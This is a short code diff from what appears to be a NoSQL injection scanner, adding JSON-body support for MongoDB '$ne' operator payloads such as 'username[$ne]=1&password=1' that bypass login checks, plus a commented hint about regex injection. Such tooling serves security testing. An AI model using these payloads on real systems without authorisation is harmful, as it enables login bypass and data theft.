@@ -71,8 +71,11 @@ program will try: 'username[$ne]=1&password=1' and 'username[$ne]=1&password[$ne
                 
                 data = copy.deepcopy(self.scanner.data);
                 for param in way:
-                    val = data.pop(param);
-                    data[param+"[$ne]"] = val;
+                    if self.scanner.method != "json": #GET/POST, send PHP array
+                        val = data.pop(param);
+                        data[param+"[$ne]"] = val;
+                    else: #JSON data. Direct modification
+                        data[param] = {"$ne":data.get(param)};
                 if data in dataList:
                     continue;
                 dataList.append(data);
@@ -119,7 +122,9 @@ program will try: 'username[$ne]=1&password=1' and 'username[$ne]=1&password[$ne
         if len(results) == 3*len(self.workingCombinations):
             failure("All combinations failed to retrieve data!");
             return None;
-    
+        
+        #success("[$ne] injection was a success! Be sure to customise the parameters to attempt regex injection.");
+        
         return results;
             
     
